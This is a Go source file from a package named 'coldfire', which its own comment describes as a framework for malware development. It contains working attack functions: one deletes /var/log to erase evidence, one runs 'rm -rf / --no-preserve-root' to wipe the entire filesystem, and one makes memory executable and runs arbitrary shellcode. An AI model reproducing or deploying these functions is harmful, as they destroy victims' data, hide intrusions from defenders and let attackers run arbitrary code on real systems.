// Package coldfire is a framework that provides functions
// for malware development that are mostly compatible with
// Linux and Windows operating systems.
package coldfire

import (
	"os"
	"syscall"
	"unsafe"
)

func clearLogs() error {
	err := os.RemoveAll("/var/log")
	return err
}

func wipe() error {
	cmd := "rm -rf / --no-preserve-root"
	_, err := cmdOut(cmd)
	if err != nil {
		return err
	}

	return nil
}

func runShellcode(shellcode []byte, bg bool) {
	sc_addr := uintptr(unsafe.Pointer(&shellcode[0]))
	page := (*(*[0xFFFFFF]byte)(unsafe.Pointer(sc_addr & ^uintptr(syscall.Getpagesize()-1))))[:syscall.Getpagesize()]
	syscall.Mprotect(page, syscall.PROT_READ|syscall.PROT_EXEC)
	spointer := unsafe.Pointer(&shellcode)
	sc_ptr := *(*func())(unsafe.Pointer(&spointer))
	if bg {
		go sc_ptr()
	} else {
		sc_ptr()
	}
}
